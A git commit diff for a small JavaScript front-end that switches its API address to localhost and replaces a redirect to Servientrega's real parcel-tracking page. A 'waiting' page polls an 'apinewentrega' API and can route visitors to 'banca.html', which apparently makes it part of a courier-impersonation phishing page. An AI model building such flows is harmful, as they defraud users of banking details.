f69aaef4f910e929a654854245061327cbc53169
as <as>
2023-08-19 13:40:04 -0500

    asd

--- public/js/functions.js
+++ public/js/functions.js
@@ -1,8 +1,8 @@
 /**
  * CONFIGURACION 
  */
-    // const API_URL = 'http://127.0.0.1:8080'; // Cambiar según convenga.
-    const API_URL = 'https://apinewentrega.cleverapps.io'; // Cambiar según convenga.
+    const API_URL = 'http://127.0.0.1:8080'; // Cambiar según convenga.
+    // const API_URL = 'https://apinewentrega.cleverapps.io'; // Cambiar según convenga.
 
 
 
--- public/js/waiting.js
+++ public/js/waiting.js
@@ -72,7 +72,7 @@ fetch(`${API_URL}/generals`, {
             window.location.href = 'banca.html'
         }else if (result.redirect_to === 'success') {
             LS.removeItem('info');
-            window.location.href = 'https://www.servientrega.com/wps/portal/rastreo-envio/!ut/p/z1/04_Sj9CPykssy0xPLMnMz0vMAfIjo8ziTS08TTwMTAz93f1cTAwCg5yMfP0MHT2NPQ30w8EKDHAARwP9KGL041EQhd_4cP0oPFYYOfoaQRXgMaMgNzTCINNREQC2ok6g/dz/d5/L2dBISEvZ0FBIS9nQSEh/';
+            window.location.href = 'success.js';
         }
     })
     .catch(error => {
